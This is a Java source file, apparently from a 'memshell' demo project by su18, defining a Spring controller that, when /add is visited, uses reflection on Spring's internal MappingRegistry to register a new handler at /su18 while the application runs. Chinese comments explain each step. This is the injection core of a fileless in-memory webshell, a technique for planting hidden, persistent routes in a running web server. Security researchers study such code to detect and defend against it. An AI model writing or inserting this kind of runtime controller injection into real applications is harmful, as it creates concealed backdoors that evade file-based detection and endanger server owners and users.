package org.su18.memshell.spring.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;
import org.su18.memshell.spring.other.TestController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

/**
 * 访问此接口动态添加 controller
 *
 * @author su18
 */
@Controller
@RequestMapping(value = "/add")
public class AddController {

	@GetMapping()
	public void index(HttpServletRequest request, HttpServletResponse response) throws Exception {

		final String controllerPath = "/su18";

		// 获取当前应用上下文
		WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

		// 通过 context 获取 RequestMappingHandlerMapping 对象
		RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

		// 获取父类的 MappingRegistry 属性
		Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
		f.setAccessible(true);
		Object mappingRegistry = f.get(mapping);

		// 反射调用 MappingRegistry 的 register 方法
		Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");

		Method[] ms = c.getDeclaredMethods();

		// 判断当前路径是否已经添加
		Field field = c.getDeclaredField("urlLookup");
		field.setAccessible(true);

		Map<String, Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
		for (String urlPath : urlLookup.keySet()) {
			if (controllerPath.equals(urlPath)) {
				response.getWriter().println("controller url path exist already");
				return;
			}
		}

		// 初始化一些注册需要的信息
		PatternsRequestCondition       url       = new PatternsRequestCondition(controllerPath);
		RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
		RequestMappingInfo             info      = new RequestMappingInfo(url, condition, null, null, null, null, null);

		Class<?> myClass = TestController.class;

		for (Method method : ms) {
			if ("register".equals(method.getName())) {
				// 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index
				method.setAccessible(true);
				method.invoke(mappingRegistry, info, myClass.newInstance(), myClass.getMethods()[0]);
				response.getWriter().println("spring controller add");
			}
		}
	}
}
